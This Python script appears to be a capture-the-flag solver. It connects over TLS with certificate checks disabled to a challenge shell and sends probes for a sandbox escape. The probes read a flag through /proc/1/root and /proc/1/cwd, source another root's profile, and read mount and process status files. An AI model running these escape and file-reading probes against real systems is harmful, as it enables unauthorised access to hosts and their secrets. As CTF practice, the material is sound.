#!/usr/bin/env python3
import socket, ssl, time, sys

host = "50892d7718ca42a5b6ff.tcp.kit.sasc.tf"
port = 443

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)
s = ctx.wrap_socket(sock, server_hostname=host)
s.connect((host, port))

def recv_until_prompt(timeout=2):
    """Read until we see a prompt or timeout"""
    data = b""
    end = time.time() + timeout
    s.settimeout(0.3)
    while time.time() < end:
        try:
            chunk = s.recv(4096)
            if not chunk: break
            data += chunk
            if b"# " in data and data.rstrip().endswith(b"#"):
                break
        except:
            break
    return data.decode(errors='replace')

def cmd(c):
    s.send((c + "\n").encode())
    return recv_until_prompt()

# Read initial banner
init = recv_until_prompt()
print("INIT:", init[:100])

# Quick tests
print("\n== Test1: /proc/1/root type")
print(cmd("test -d /proc/1/root && echo DIR || test -f /proc/1/root && echo FILE || test -L /proc/1/root && echo LINK || echo OTHER"))

print("\n== Test2: stat /proc/1/root via read")
print(cmd("read -r _ < /proc/1/root 2>&1; echo RC=$?"))

print("\n== Test3: check socat parent")
print(cmd("echo /proc/1/fd/*"))
print(cmd("echo /proc/self/fd/*"))

print("\n== Test4: check if flag is path-accessible")
# Try to cat flag via proc of parent
print(cmd('while read -r l; do echo "FL: $l"; done < /proc/1/root/flag 2>&1'))
print(cmd('while read -r l; do echo "FL: $l"; done < /proc/1/cwd/flag 2>&1'))

# Try to use shell's . command to source scripts
print("\n== Test5: source scripts from outside")
print(cmd('. /proc/1/root/etc/profile 2>&1'))

# The "mount" approach - can we see what's mounted?
print("\n== Test6: mount info")
print(cmd('cat /proc/mounts 2>&1 | while read -r l; do echo "M: $l"; done'))
print(cmd('cat /proc/1/mounts 2>&1 | while read -r l; do echo "M: $l"; done'))

# Check /proc/1/status for UID
print("\n== Test7: process info")
print(cmd('while read -r l; do echo "S: $l"; done < /proc/self/status 2>&1'))
print(cmd('while read -r l; do echo "S: $l"; done < /proc/1/status 2>&1'))

s.close()